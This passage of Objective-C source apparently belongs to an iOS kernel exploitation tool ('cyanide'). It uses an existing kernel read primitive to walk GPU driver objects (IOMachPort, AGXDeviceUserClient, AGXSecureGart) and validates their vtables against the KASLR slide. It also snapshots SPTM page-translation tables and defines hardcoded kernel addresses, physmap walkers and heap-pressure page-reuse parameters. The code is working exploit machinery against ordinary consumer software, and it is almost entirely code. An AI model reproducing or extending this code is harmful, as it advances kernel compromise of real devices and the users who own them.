        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-ip-kobject-read-failed", phaseName];
        return false;
    }

    CNDUatE1Progress(report, hop, @"kernel-authenticate-metal-io-connect", 0);
    io_service_t authenticatedService = IO_OBJECT_NULL;
    kern_return_t authKR = IOConnectGetService(connection,
                                                &authenticatedService);
    bool expectedNoService = authKR == CNDUatE1ExpectedNoService &&
        authenticatedService == IO_OBJECT_NULL;
    bool returnedService = authKR == KERN_SUCCESS &&
        authenticatedService != IO_OBJECT_NULL;
    if (authenticatedService != IO_OBJECT_NULL) {
        IOObjectRelease(authenticatedService);
        authenticatedService = IO_OBJECT_NULL;
    }
    anchor[@"authKR"] = CNDUatE1Hex((uint32_t)authKR);
    anchor[@"kernelAuthDispatchPassed"] =
        @(expectedNoService || returnedService);
    CNDUatE1Persist(report);
    if (!expectedNoService && !returnedService) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-kernel-auth-dispatch-failed", phaseName];
        return false;
    }

    uint64_t portObjectAfter = api->portObject(selfTask, connection);
    uint64_t clientRawAfter = 0;
    CNDUatE1Progress(report, hop, @"read-raw-ip-kobject-after",
                     ipKobjectAddress);
    if (portObjectAfter != portObjectBefore ||
        !CNDUatE1Read64(api, ipKobjectAddress, &clientRawAfter) ||
        clientRawAfter != clientRawBefore) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-ip-kobject-not-stable", phaseName];
        return false;
    }

    uint64_t wrapper = CNDUatE1CanonicalPointer(api, clientRawAfter);
    bool wrapperShapePassed = wrapper != 0 && (wrapper & 0x7) == 0;
    anchor[@"rawIPKobject"] = CNDUatE1Hex(clientRawAfter);
    anchor[@"wrapper"] = CNDUatE1Hex(wrapper);
    anchor[@"stableAcrossAuthCall"] = @YES;
    anchor[@"wrapperShapePassed"] = @(wrapperShapePassed);
    CNDUatE1Persist(report);
    if (!wrapperShapePassed || !CNDUatE1ValidateLifecycleVptr(
            report, api, [hop stringByAppendingString:@".iomachport"],
            wrapper, CNDUatE1IOMachPortVtable, slide,
            @"IOMachPort constructor and IOConnectGetService converter "
             "kernel-authentication witness", NULL)) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-iomachport-predicate-failed", phaseName];
        return false;
    }

    CNDUatE1Progress(report, hop, @"read-iomachport-object",
                     wrapper + CNDUatE1IOMachPortObject);
    uint64_t clientRaw = 0;
    if (!CNDUatE1Read64(api, wrapper + CNDUatE1IOMachPortObject,
                        &clientRaw)) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-client-read-failed", phaseName];
        return false;
    }
    uint64_t client = CNDUatE1CanonicalPointer(api, clientRaw);
    bool clientShapePassed = client != 0 && (client & 0x7) == 0;
    anchor[@"client"] = CNDUatE1PointerReport(api, clientRaw);
    anchor[@"clientShapePassed"] = @(clientShapePassed);
    CNDUatE1Persist(report);
    if (!clientShapePassed || !CNDUatE1ValidateLifecycleVptr(
            report, api, [hop stringByAppendingString:@".client"], client,
            CNDUatE1AGXDeviceUserClientVtable, slide,
            @"kernel-authenticated IOMachPort+0x20 object; exact "
             "AGXDeviceUserClient vtable equality before client fields",
            NULL)) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-client-predicate-failed", phaseName];
        return false;
    }

    CNDUatE1Progress(report, hop, @"read-client-task",
                     client + CNDUatE1ClientTask);
    uint64_t taskRaw = 0;
    if (!CNDUatE1Read64(api, client + CNDUatE1ClientTask, &taskRaw)) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-task-read-failed", phaseName];
        return false;
    }
    uint64_t task = CNDUatE1CanonicalPointer(api, taskRaw);
    bool taskShapePassed = task != 0 && (task & 0x7) == 0;
    anchor[@"task"] = CNDUatE1PointerReport(api, taskRaw);
    anchor[@"taskShapePassed"] = @(taskShapePassed);
    CNDUatE1Persist(report);
    if (!taskShapePassed || !CNDUatE1ValidateLifecycleVptr(
            report, api, [hop stringByAppendingString:@".task"], task,
            CNDUatE1AGXSharedVtable, slide,
            @"AGXDeviceUserClient+0x120 factory-authenticated AGXShared; "
             "live Metal device retains the connection", NULL)) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-task-predicate-failed", phaseName];
        return false;
    }

    CNDUatE1Progress(report, hop, @"read-task-gart",
                     task + CNDUatE1TaskGart);
    uint64_t taskGartRaw = 0;
    if (!CNDUatE1Read64(api, task + CNDUatE1TaskGart, &taskGartRaw)) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-task-gart-read-failed", phaseName];
        return false;
    }
    uint64_t taskGart = CNDUatE1CanonicalPointer(api, taskGartRaw);
    bool taskGartShapePassed = taskGart != 0 && (taskGart & 0x7) == 0;
    anchor[@"taskGart"] = CNDUatE1PointerReport(api, taskGartRaw);
    anchor[@"taskGartShapePassed"] = @(taskGartShapePassed);
    CNDUatE1Persist(report);
    if (!taskGartShapePassed || !CNDUatE1ValidateLifecycleVptr(
            report, api, [hop stringByAppendingString:@".task-gart"],
            taskGart, CNDUatE1GartVtable, slide,
            @"AGXShared task+0x58 exact AGXSecureGart factory/init witness; "
             "live Metal device retains task", NULL)) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-task-gart-predicate-failed", phaseName];
        return false;
    }

    garts[*gartCount].address = taskGart;
    garts[*gartCount].anchorIndex = 0;
    garts[*gartCount].resolverSelector = 0;
    garts[*gartCount].perTask = true;
    garts[*gartCount].derivedDomain = false;
    garts[*gartCount].metalAction = true;
    (*gartCount)++;

    const uint64_t domainOffsets[3] = {
        CNDUatE1GartResolverDomain1,
        CNDUatE1GartResolverDomain3,
        CNDUatE1GartResolverDomain7,
    };
    const NSUInteger selectors[3] = {1, 3, 7};
    NSMutableArray<NSDictionary<NSString *, id> *> *domains =
        [NSMutableArray array];
    anchor[@"resolverDomains"] = domains;
    for (NSUInteger index = 0; index < 3; index++) {
        uint64_t field = taskGart + domainOffsets[index];
        NSUInteger selector = selectors[index];
        CNDUatE1Progress(report, hop, @"read-task-resolver-domain", field);
        uint64_t domainRaw = 0;
        if (!CNDUatE1Read64(api, field, &domainRaw)) {
            if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
                @"metal-connection-%@-domain%lu-read-failed", phaseName,
                (unsigned long)selector];
            return false;
        }
        uint64_t domain = CNDUatE1CanonicalPointer(api, domainRaw);
        NSMutableDictionary<NSString *, id> *domainReport = [@{
            @"selector": @(selector),
            @"fieldOffset": [NSString stringWithFormat:@"0x%llx",
                (unsigned long long)domainOffsets[index]],
            @"pointer": CNDUatE1PointerReport(api, domainRaw),
        } mutableCopy];
        [domains addObject:domainReport];
        CNDUatE1Persist(report);
        if (domain == 0) {
            domainReport[@"result"] = @"null-skipped";
            CNDUatE1Persist(report);
            log_user("[UAT_E1] phase=%s metal-task resolver selector=%lu "
                     "result=null-skipped\n", phaseName.UTF8String,
                     (unsigned long)selector);
            continue;
        }
        bool shapePassed = (domain & 0x7) == 0;
        NSString *domainHop = [hop stringByAppendingFormat:
            @".domain%lu", (unsigned long)selector];
        if (!shapePassed || !CNDUatE1ValidateLifecycleVptr(
                report, api, domainHop, domain, CNDUatE1GartVtable, slide,
                @"validated Metal task GART fixed resolver field; same "
                 "AGXSecureGart factory and parent-retained child", NULL)) {
            domainReport[@"result"] = @"predicate-failed";
            CNDUatE1Persist(report);
            if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
                @"metal-connection-%@-domain%lu-predicate-failed",
                phaseName, (unsigned long)selector];
            return false;
        }
        if (*gartCount >= capacity) {
            if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
                @"metal-connection-%@-gart-capacity-failed", phaseName];
            return false;
        }
        garts[*gartCount].address = domain;
        garts[*gartCount].anchorIndex = selector;
        garts[*gartCount].resolverSelector = selector;
        garts[*gartCount].perTask = true;
        garts[*gartCount].derivedDomain = true;
        garts[*gartCount].metalAction = true;
        (*gartCount)++;
        domainReport[@"result"] = @"validated-phase-anchor";
        CNDUatE1Persist(report);
    }

    anchor[@"result"] = @"validated-metal-task-gart";
    anchor[@"phaseGartCount"] = @(*gartCount);
    CNDUatE1Persist(report);
    log_user("[UAT_E1] phase=%s metal-connection=0x%08x client=0x%016llx "
             "task=0x%016llx gart=0x%016llx validated=yes\n",
             phaseName.UTF8String, connection,
             (unsigned long long)client, (unsigned long long)task,
             (unsigned long long)taskGart);
    return true;
}

static NSDictionary<NSString *, id> *CNDUatE1TTBATDecodedWord(
    uint64_t word, NSUInteger index, NSUInteger root)
{
    uint64_t contextID =
        (word & CNDUatE1TTBATContextMask) >> 48;
    bool valid = (word & 1) != 0;
    return @{
        @"index": @(index),
        @"root": @(root),
        @"word": CNDUatE1Hex(word),
        @"contextID": @(contextID),
        @"paddr": CNDUatE1Hex(word & CNDUatE1TTBATPaddrMask),
        @"valid": @(valid),
        @"shapeValid": @(!valid ||
            ((word & ~CNDUatE1TTBATAllowedMask) == 0 &&
             contextID == index)),
    };
}

static NSDictionary<NSString *, id> *CNDUatE1TTBATSummary(
    NSString *label, uint64_t ttbat, const CNDUatE1TTBATSnapshot *snapshot,
    bool *shapePassedOut)
{
    if (shapePassedOut != NULL) *shapePassedOut = false;
    if (snapshot == NULL) return @{};
    NSMutableArray *validEntries = [NSMutableArray array];
    NSMutableArray *badWords = [NSMutableArray array];
    for (NSUInteger index = 0; index < CNDUatE1TTBATEntries; index++) {
        NSDictionary *word0 = CNDUatE1TTBATDecodedWord(
            snapshot->words[index * 2], index, 0);
        NSDictionary *word1 = CNDUatE1TTBATDecodedWord(
            snapshot->words[index * 2 + 1], index, 1);
        bool valid0 = [word0[@"valid"] boolValue];
        bool valid1 = [word1[@"valid"] boolValue];
        if (!valid0 && !valid1) continue;
        [validEntries addObject:@{
            @"index": @(index),
            @"word0": word0,
            @"word1": word1,
        }];
        if ((valid0 && ![word0[@"shapeValid"] boolValue]) ||
            (valid1 && ![word1[@"shapeValid"] boolValue])) {
            [badWords addObject:@{
                @"index": @(index),
                @"word0": word0,
                @"word1": word1,
            }];
        }
    }
    NSDictionary *summary = @{
        @"label": label ?: @"snapshot",
        @"tableKind": @"SPTM-TTBAT",
        @"ttbat": CNDUatE1Hex(ttbat),
        @"entryCount": @(CNDUatE1TTBATEntries),
        @"stride": @(CNDUatE1TTBATStride),
        @"bytesRead": @(sizeof(*snapshot)),
        @"checkedReadAPICalls": @1,
        @"checkedReadInternal32ByteChunks":
            @(sizeof(*snapshot) / 32),
        @"validEntries": validEntries,
        @"validEntryCount": @(validEntries.count),
        @"invalidShapeEntries": badWords,
        @"shapePassed": @(badWords.count == 0),
    };
    if (shapePassedOut != NULL) *shapePassedOut = badWords.count == 0;
    log_user("[UAT_E1] %s ttbat=0x%016llx validEntries=%lu shape=%s\n",
             label.UTF8String ?: "snapshot", (unsigned long long)ttbat,
             (unsigned long)validEntries.count,
             badWords.count == 0 ? "pass" : "fail");
    return summary;
}

static bool CNDUatE1TTBATShapePassedRaw(
    const CNDUatE1TTBATSnapshot *snapshot)
{
    if (snapshot == NULL) return false;
    for (NSUInteger index = 0; index < CNDUatE1TTBATEntries; index++) {
        for (NSUInteger root = 0; root < 2; root++) {
            uint64_t word = snapshot->words[index * 2 + root];
            if ((word & 1) == 0) continue;
            uint64_t contextID =
                (word & CNDUatE1TTBATContextMask) >> 48;
            if ((word & ~CNDUatE1TTBATAllowedMask) != 0 ||
                contextID != index) {
                return false;
            }
        }
    }
    return true;
}

static bool CNDUatE1SnapshotTTBAT(
    NSMutableDictionary<NSString *, id> *report,
    const CNDUatE1API *api, NSString *label, uint64_t ttbat,
    CNDUatE1TTBATSnapshot *snapshot,
    NSDictionary<NSString *, id> **summaryOut)
{
    if (snapshot == NULL) return false;
    memset(snapshot, 0, sizeof(*snapshot));
    CNDUatE1Progress(report, label, @"snapshot-1024-byte-read", ttbat);
    if (!CNDUatE1Read(api, ttbat, snapshot, sizeof(*snapshot))) return false;
    bool shapePassed = false;
    NSDictionary *summary = CNDUatE1TTBATSummary(
        label, ttbat, snapshot, &shapePassed);
    if (summaryOut != NULL) *summaryOut = summary;
    return shapePassed;
}

static bool CNDUatE1SnapshotGartContextIDs(
    NSMutableDictionary<NSString *, id> *report,
    const CNDUatE1API *api, uint64_t slide, NSString *phase,
    NSString *reportKey, const CNDUatE1ValidatedGart *garts,
    NSUInteger gartCount,
    NSArray<NSDictionary<NSString *, id> *> **snapshotOut,
    NSString **reasonOut)
{
    NSMutableArray<NSDictionary<NSString *, id> *> *gartReports =
        [NSMutableArray array];
    for (NSUInteger position = 0; position < gartCount; position++) {
        uint64_t gart = garts[position].address;
        NSUInteger index = garts[position].anchorIndex;
        bool perTask = garts[position].perTask;
        bool derivedDomain = garts[position].derivedDomain;
        bool metalAction = garts[position].metalAction;
        NSUInteger resolverSelector = garts[position].resolverSelector;
        NSString *anchorKind = derivedDomain
            ? (metalAction ? @"metal-device-task-resolver-domain"
                           : @"observer-client-task-resolver-domain")
            : (perTask ? (metalAction ? @"metal-device-task"
                                      : @"observer-client-task")
                       : @"accelerator-global");
        NSString *hop = [NSString stringWithFormat:
            @"route1.contexts.%@.%@%lu", phase ?: @"unknown",
            derivedDomain ? @"task-domain-gart" :
                (perTask ? @"task-gart" : @"accelerator-gart"),
            (unsigned long)index];
        if (gart == 0 || !CNDUatE1ValidateLifecycleVptr(
                report, api, hop, gart, CNDUatE1GartVtable, slide,
                derivedDomain
                    ? (metalAction
                    ? @"validated Metal-device task GART resolver fields "
                       "+0x338/+0x340/+0x348; live Metal device retains "
                       "parent; phase-local exact child-vptr revalidation"
                    : @"validated task GART resolver fields +0x338/+0x340/"
                       "+0x348; same accelerator +0x858 AGXSecureGart "
                       "factory and +0xa8 init; parent retains child; "
                       "phase-local exact vptr revalidation")
                    : (perTask
                    ? (metalAction
                    ? @"IOGPUMetalDevice._acceleratorPort userland bridge; "
                       "client+0x120 task and task+0x58 GART exact gates; "
                       "live Metal device retains connection and task"
                    : @"client+0x120 task factory auth 0xa52c0b4..0xa52c0e4; "
                       "task+0x58 GART factory/init auth "
                       "0xa51cf4c..0xa51cf88 and 0x8b2e4dc..0x8b2e508; "
                       "live observer holds client; phase-local revalidation")
                    : @"previous exact AGXSecureGart gate plus live "
                       "observer-held accelerator; phase-local vptr "
                       "revalidation"), NULL)) {
            if (reasonOut != NULL) {
                *reasonOut = [NSString stringWithFormat:
                    @"gart-context-%@-%@%lu-vptr-failed",
                    phase ?: @"unknown",
                    perTask ? @"task-gart" : @"accelerator-gart",
                    (unsigned long)index];
            }
            return false;
        }

        NSMutableDictionary<NSString *, id> *gartReport = [@{
            @"phase": phase ?: @"unknown",
            @"index": @(index),
            @"anchorKind": anchorKind,
            @"perTask": @(perTask),
            @"derivedDomain": @(derivedDomain),
            @"metalAction": @(metalAction),
            @"resolverSelector": @(resolverSelector),
            @"gart": CNDUatE1Hex(gart),
            @"vptrRevalidated": @YES,
            @"contextIDs": [NSMutableArray array],
        } mutableCopy];
        [gartReports addObject:gartReport];
        if (reportKey != nil) report[reportKey] = gartReports;
        CNDUatE1Persist(report);

        NSMutableArray<NSDictionary<NSString *, id> *> *contextIDs =
            gartReport[@"contextIDs"];
        for (NSUInteger domain = 0;
             domain < CNDUatE1GartContextIDCount; domain++) {
            uint64_t contextField = gart + CNDUatE1GartContextID0 +
                domain * sizeof(uint32_t);
            NSString *contextHop = [NSString stringWithFormat:
                @"%@.context%lu", hop, (unsigned long)domain];
            CNDUatE1Progress(report, contextHop,
                             @"read-phase-gart-context-id", contextField);
            uint32_t contextID = UINT32_MAX;
            if (!CNDUatE1Read32(api, contextField, &contextID)) {
                if (reasonOut != NULL) {
                    *reasonOut = [NSString stringWithFormat:
                        @"gart-context-%@-gart%lu-domain%lu-read-failed",
                        phase ?: @"unknown", (unsigned long)index,
                        (unsigned long)domain];
                }
                return false;
            }
            bool sentinel = contextID == UINT32_MAX;
            bool rangePassed = sentinel ||
                contextID < CNDUatE1TTBATEntries;
            NSDictionary<NSString *, id> *contextReport = @{
                @"phase": phase ?: @"unknown",
                @"domain": @(domain),
                @"domainName": CNDUatE1GartDomainNames[domain],
                @"domainWitness": CNDUatE1GartDomainWitnesses[domain],
                @"fieldOffset": [NSString stringWithFormat:@"0x%llx",
                    (unsigned long long)(CNDUatE1GartContextID0 +
                                         domain * sizeof(uint32_t))],
                @"raw": [NSString stringWithFormat:@"0x%08x", contextID],
                @"contextID": sentinel ? [NSNull null] : @(contextID),
                @"sentinel": @(sentinel),
                @"active": @(!sentinel),
                @"rangePassed": @(rangePassed),
                @"staticWitness":
                    @"C06 allocator 0x8a88c48; registerContextID "
                     "0x8b2be80..0x8b2bed8; fields "
                     "+0x230/+0x234/+0x238/+0x23c",
            };
            [contextIDs addObject:contextReport];
            if (reportKey != nil) report[reportKey] = gartReports;
            CNDUatE1Persist(report);
            log_user("[UAT_E1] phase=%s anchor=%s gart=%lu domain=%lu "
                     "contextID=0x%08x predicate=%s\n",
                     phase.UTF8String ?: "unknown",
                     anchorKind.UTF8String ?: "unknown",
                     (unsigned long)index,
                     (unsigned long)domain, contextID,
                     rangePassed ? "pass" : "fail");
            if (!rangePassed) {
                if (reasonOut != NULL) {
                    *reasonOut = [NSString stringWithFormat:
                        @"gart-context-%@-gart%lu-domain%lu-range-failed",
                        phase ?: @"unknown", (unsigned long)index,
                        (unsigned long)domain];
                }
                return false;
            }
        }
    }
    if (snapshotOut != NULL) *snapshotOut = gartReports;
    return true;
}

static NSArray<NSDictionary<NSString *, id> *> *
CNDUatE1AssociateGartContextsWithTTBAT(
    NSArray<NSDictionary<NSString *, id> *> *gartReports,
    NSDictionary<NSString *, id> *ttbatSummary)
{
    NSMutableDictionary<NSNumber *, NSDictionary<NSString *, id> *> *entries =
        [NSMutableDictionary dictionary];
    for (NSDictionary<NSString *, id> *entry in
         ttbatSummary[@"validEntries"] ?: @[]) {
        NSNumber *index = entry[@"index"];
        if (index != nil) entries[index] = entry;
    }

    NSMutableArray<NSDictionary<NSString *, id> *> *associations =
        [NSMutableArray array];
    for (NSDictionary<NSString *, id> *gart in gartReports ?: @[]) {
        NSNumber *gartIndex = gart[@"index"] ?: @0;
        for (NSDictionary<NSString *, id> *context in
             gart[@"contextIDs"] ?: @[]) {
            if (![context[@"active"] boolValue]) continue;
            NSNumber *contextID = context[@"contextID"];
            NSDictionary<NSString *, id> *entry = entries[contextID];
            NSMutableDictionary<NSString *, id> *association = [@{
                @"gartIndex": gartIndex,
                @"gart": gart[@"gart"] ?: @"unknown",
                @"anchorKind": gart[@"anchorKind"] ?: @"unknown",
                @"perTask": gart[@"perTask"] ?: @NO,
                @"derivedDomain": gart[@"derivedDomain"] ?: @NO,
                @"resolverSelector": gart[@"resolverSelector"] ?: @0,
                @"domain": context[@"domain"] ?: @0,
                @"domainName": context[@"domainName"] ?: @"unknown",
                @"phase": context[@"phase"] ?: @"unknown",
                @"contextID": contextID ?: @0,
                @"ttbatEntryPresent": @(entry != nil),
            } mutableCopy];
            if (entry != nil) {
                association[@"word0"] = entry[@"word0"];
                association[@"word1"] = entry[@"word1"];
            }
            [associations addObject:association];
        }
    }
    return associations;
}

static NSArray<NSDictionary<NSString *, id> *> *CNDUatE1TTBATDiff(
    const CNDUatE1TTBATSnapshot *before,
    const CNDUatE1TTBATSnapshot *after, uint64_t ttbat, NSString *phase)
{
    NSMutableArray *changes = [NSMutableArray array];
    if (before == NULL || after == NULL) return changes;
    NSString *transition = phase ?: @"unknown";
    bool closeTransition = [transition isEqualToString:@"close"] ||
        [transition isEqualToString:@"release"];
    for (NSUInteger index = 0; index < CNDUatE1TTBATEntries; index++) {
        uint64_t b0 = before->words[index * 2];
        uint64_t b1 = before->words[index * 2 + 1];
        uint64_t a0 = after->words[index * 2];
        uint64_t a1 = after->words[index * 2 + 1];
        if (b0 == a0 && b1 == a1) continue;
        bool validBefore = (b0 & 1) != 0 || (b1 & 1) != 0;
        bool validAfter = (a0 & 1) != 0 || (a1 & 1) != 0;
        [changes addObject:@{
            @"tableKind": @"SPTM-TTBAT",
            @"ttbat": CNDUatE1Hex(ttbat),
            @"phase": transition,
            @"index": @(index),
            @"beforeWord0": CNDUatE1TTBATDecodedWord(b0, index, 0),
            @"beforeWord1": CNDUatE1TTBATDecodedWord(b1, index, 1),
            @"afterWord0": CNDUatE1TTBATDecodedWord(a0, index, 0),
            @"afterWord1": CNDUatE1TTBATDecodedWord(a1, index, 1),
            @"becameValid": @(!validBefore && validAfter),
            @"becameInvalid": @(validBefore && !validAfter),
            @"clearedOnClose": @(closeTransition && validBefore &&
                                  !validAfter),
            @"clearedOnRelease": @(
                [transition isEqualToString:@"release"] && validBefore &&
                !validAfter),
        }];
    }
    return changes;
}

#pragma mark - E2 disposable Metal task

enum {
    CNDUatE2ChildReadyFD = 198,
    CNDUatE2ChildReleaseFD = 199,
    CNDUatE2ChildMessageMagic = 0x45324348, // "E2CH"
    CNDUatE2ChildMessageVersion = 1,
    CNDUatE2ChildReleaseByte = 0xa5,
    CNDUatE2RetirePollCount = 10,
    CNDUatE2ExternalMessageMagic = 0x45324558, // "E2EX"
    CNDUatE2ExternalMessageVersion = 5,
    CNDUatE2ExternalMessageReady = 1,
    CNDUatE2ExternalMessageExiting = 2,
    CNDUatE2ExternalMessageCompleted = 3,
    CNDUatE2ExternalModeRetire = 1,
    CNDUatE2ExternalModeLatch = 2,
    CNDUatE4ExternalModeInflight = 3,
    CNDUatE5ExternalModeOwnerRelease = 4,
    CNDUatE5ExternalModeDeviceRelease = 5,
    CNDUatE5ExternalModeConnectionRelease = 6,
    CNDUatE5ExternalModeRawQueueRelease = 7,
    CNDUatE5ExternalModeRawQueueBindRelease = 8,
    CNDUatE2ExternalTokenBytes = 16,
    CNDUatE2ExternalSubmitByte = 0x5a,
    CNDUatE2ExternalAcceptTimeoutMS = 60000,
    CNDUatE2ExternalMessageTimeoutMS = 15000,
    CNDUatE2ExternalExitTimeoutMS = 5000,
    CNDUatE2ProcessGonePollCount = 300,
    CNDUatE2FreeMaskPollCount = 100,
    CNDUatE2PostExitPollIntervalUS = 10000,
    CNDUatE4ConfigMagic = 0x45344346, // "E4CF"
    CNDUatE4ConfigVersion = 2,
    CNDUatE4ControlMarker = 0xe4c01101,
    CNDUatE4TerminalMarker = 0xe4f1a104,
    CNDUatE5ReleaseMarker = 0xe5d00105,
    CNDUatE5DeviceReleaseMarker = 0xe5d00205,
    CNDUatE5DeviceControlMarker = 0xd5d5d5d5,
    CNDUatE5ConnectionReleaseMarker = 0xe5d00305,
    CNDUatE5ConnectionControlMarker = 0xc5c5c5c5,
    CNDUatE5RawQueueReleaseMarker = 0xe5d00405,
    CNDUatE5RawQueueControlMarker = 0xa5a5a5a5,
    CNDUatE5RawQueueBindReleaseMarker = 0xe5d00505,
    CNDUatE5RawQueueBindControlMarker = 0xb5b5b5b5,
    CNDUatE4WorkloadRounds = 8000000,
    CNDUatE4PollCount = 30,
    // The first physical App Group run proved the exact entry stayed valid
    // throughout a 7.5 ms window after ESRCH. Keep the same 30-read budget,
    // but spread it across 2.9 seconds to test asynchronous context teardown.
    CNDUatE4PollIntervalUS = 100000,
    CNDUatE4PostClearMarkerPollCount = 100,
    CNDUatE4PostClearMarkerPollIntervalUS = 1000,
    CNDUatE5OwnerQueue = 1U << 0,
    CNDUatE5OwnerSharedBuffer = 1U << 1,
    CNDUatE5OwnerLibrary = 1U << 2,
    CNDUatE5OwnerFunction = 1U << 3,
    CNDUatE5OwnerPipeline = 1U << 4,
    CNDUatE5OwnerCommand = 1U << 5,
    CNDUatE5OwnerEncoder = 1U << 6,
    CNDUatE5OwnerDevice = 1U << 7,
    CNDUatE5RequiredOwnerMask =
        CNDUatE5OwnerQueue | CNDUatE5OwnerSharedBuffer |
        CNDUatE5OwnerLibrary | CNDUatE5OwnerFunction |
        CNDUatE5OwnerPipeline | CNDUatE5OwnerCommand |
        CNDUatE5OwnerEncoder,
    CNDUatE5RequiredDeviceMask =
        CNDUatE5OwnerQueue | CNDUatE5OwnerSharedBuffer |
        CNDUatE5OwnerLibrary | CNDUatE5OwnerFunction |
        CNDUatE5OwnerPipeline | CNDUatE5OwnerCommand |
        CNDUatE5OwnerEncoder | CNDUatE5OwnerDevice,
    CNDUatE5RequiredConnectionMask =
        CNDUatE5OwnerQueue | CNDUatE5OwnerDevice,
};

typedef struct {
    uint32_t magic;
    uint32_t version;
    int32_t result;
    uint32_t pid;
    uint32_t metalStatus;
    uint32_t fillVerified;
} CNDUatE2ChildMessage;

typedef struct {
    uint32_t magic;
    uint32_t version;
    uint32_t type;
    int32_t result;
    uint32_t pid;
    uint32_t metalStatus;
    uint32_t fillVerified;
    uint32_t mode;
    uint64_t gpuAddress;
    uint64_t secondaryGPUAddress;
    uint32_t primaryPatternBytes;
    uint32_t secondaryPatternBytes;
    uint8_t token[CNDUatE2ExternalTokenBytes];
    uint32_t surfaceID;
    uint32_t workloadRounds;
    uint32_t markerValue;
    uint32_t reserved;
} CNDUatE2ExternalMessage;

_Static_assert(sizeof(CNDUatE2ExternalMessage) == 88,
               "E2 external wire message must remain stable");

typedef struct {
    uint32_t magic;
    uint32_t version;
    uint32_t controlMarker;
    uint32_t terminalMarker;
    uint32_t workloadRounds;
    uint32_t reserved;
    uint64_t fileDevice;
    uint64_t fileInode;
    uint8_t token[CNDUatE2ExternalTokenBytes];
} CNDUatE4Config;

_Static_assert(sizeof(CNDUatE4Config) == 56,
               "E4 observer config must remain stable");

typedef struct {
    uint64_t timestamp;
    uint64_t word0;
    uint64_t word1;
    uint32_t markerBefore;
    uint32_t markerAfter;
    bool readPassed;
    bool valid;
} CNDUatE4PollSample;

static NSString *const CNDUatE4AppGroupIdentifier =
    @"group.com.zeroxjf.cyanide.e4.ztgmy9fa3v";
static NSString *const CNDUatE4HelperBundleIdentifier =
    @"com.zeroxjf.cyanide.e4helper.ztgmy9fa3v";

typedef struct {
    int listenFD;
    int peerFD;
    uint16_t port;
    uint8_t token[CNDUatE2ExternalTokenBytes];
} CNDUatE2ExternalRendezvous;

enum {
    CNDUatE2GuidedPressurePages = 32768,
    CNDUatE2GuidedPressureChunkPages = 4096,
    CNDUatE2GuidedMagazineTailPages = 512,
    CNDUatE2GuidedCapturePages =
        CNDUatE2GuidedPressureChunkPages +
        CNDUatE2GuidedMagazineTailPages,
    CNDUatE2GuidedPressurePolls =
        CNDUatE2GuidedPressurePages /
        CNDUatE2GuidedPressureChunkPages,
    CNDUatE2GuidedMaskPollCapacity =
        CNDUatE2GuidedPressurePolls + 1,
    CNDUatE2ReuseCandidatePages =
        CNDUatE2GuidedPressurePages +
        CNDUatE2GuidedMagazineTailPages,
    CNDUatE2ReuseGuardPages = 2,
    CNDUatE2TranslationMaximumPages = CNDUatE2ReuseCandidatePages,
    CNDUatE2ReuseTotalPages =
        CNDUatE2ReuseCandidatePages + CNDUatE2ReuseGuardPages,
    CNDUatE2PhysmapMaximumRanges = 64,
    CNDUatE2TranslationLeafMaximumEntries =
        CNDUatE1PageSize / sizeof(uint64_t),
};

_Static_assert(
    CNDUatE2GuidedPressurePages %
        CNDUatE2GuidedPressureChunkPages == 0,
    "guided pressure pages must divide into whole chunks");
_Static_assert(
    CNDUatE2GuidedCapturePages <= CNDUatE2ReuseCandidatePages,
    "guided capture must fit in the candidate reservation");
_Static_assert(
    CNDUatE2TranslationLeafMaximumEntries == 2048,
    "one 16K L3 table must contain exactly 2048 64-bit entries");

static const uint64_t CNDUatE2KernelGPhysBase =
    UINT64_C(0xfffffff007c69dc0);
static const uint64_t CNDUatE2KernelPhysmapRangeState =
    UINT64_C(0xfffffff007cace28);
static const uint64_t CNDUatE2KernelPhysmapRangeCountPointer =
    UINT64_C(0xfffffff007cace30);
static const uint64_t CNDUatE2KernelPhysmapRangeRecordsPointer =
    UINT64_C(0xfffffff007cace38);
static const uint64_t CNDUatE2KernelVMPageFreeMasks =
    UINT64_C(0xfffffff007c11128);
static const uint64_t CNDUatE2KernelPmapFirstPnum =
    UINT64_C(0xfffffff007c14e78);
static const uint64_t CNDUatE2TTAddressMask =
    UINT64_C(0x0000fffffffff000);

typedef struct {
    uint64_t physicalAddress;
    uint64_t virtualAddress;
    uint32_t pageCount;
    uint32_t reserved;
} CNDUatE2PhysmapRangeRecord;

typedef struct {
    uint64_t physicalAddress;
    uint64_t virtualAddress;
    uint64_t length;
} CNDUatE2PTOVEntry;

typedef struct {
    uint64_t size;
    uint64_t offsetMask;
    uint64_t shift;
    uint64_t indexMask;
    uint64_t validMask;
    uint64_t typeMask;
    uint64_t typeBlock;
} CNDUatE2PageTableLevel;

typedef struct {
    uint64_t selfTask;
    uint64_t map;
    uint64_t pmap;
    uint64_t rootTable;
    uint64_t rootPhysical;
    uint64_t minimum;
    uint64_t maximum;
    uint64_t attributes;
    uint64_t levelInfo;
    uint64_t virtualAddressMask;
    uint64_t gVirtBase;
    uint64_t gPhysBase;
    uint64_t gPhysSize;
    uint64_t rangeStateAddress;
    uint64_t rangeCountPointerAddress;
    uint64_t rangeRecordsPointerAddress;
    uint64_t rangeCountAddress;
    uint64_t rangeRecordsAddress;
    uint8_t rangeState;
    uint32_t rangeCount;
    CNDUatE2PTOVEntry ranges[CNDUatE2PhysmapMaximumRanges];
    CNDUatE2PageTableLevel levels[4];
} CNDUatE2CheckedWalker;

typedef struct {
    mach_vm_address_t allocation;
    mach_vm_size_t size;
    uint64_t candidateBase;
    bool allocated;
    bool guardsFaulted;
